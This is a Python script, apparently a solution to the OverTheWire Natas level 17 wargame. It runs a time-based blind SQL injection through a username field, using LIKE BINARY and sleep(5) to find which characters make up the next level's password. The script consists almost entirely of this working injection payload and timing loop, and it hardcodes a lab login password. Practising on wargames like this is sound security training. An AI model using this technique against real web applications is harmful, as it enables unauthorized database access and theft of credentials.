import requests
import time

url = 'http://natas17.natas.labs.overthewire.org/'
username = 'natas17'
password = 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd'
payload = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
used_chars = ""

session = requests.Session()
session.auth = (username, password)

def get_response_time(payload_char):
    data = {
        'username': f'natas18" AND password LIKE BINARY "%{payload_char}%" AND sleep(5) # '
    }
    start_time = time.time()
    response = session.post(url, data=data, stream=True)  # stream=Falseで即時のレスポンスを取得
    end_time = time.time()
    return end_time - start_time

for char in payload:
    response_time = get_response_time(char)
    print(f"Character '{char}': {response_time} seconds")
    if response_time > 5:
        used_chars += char

print(f"Used characters: {used_chars}")

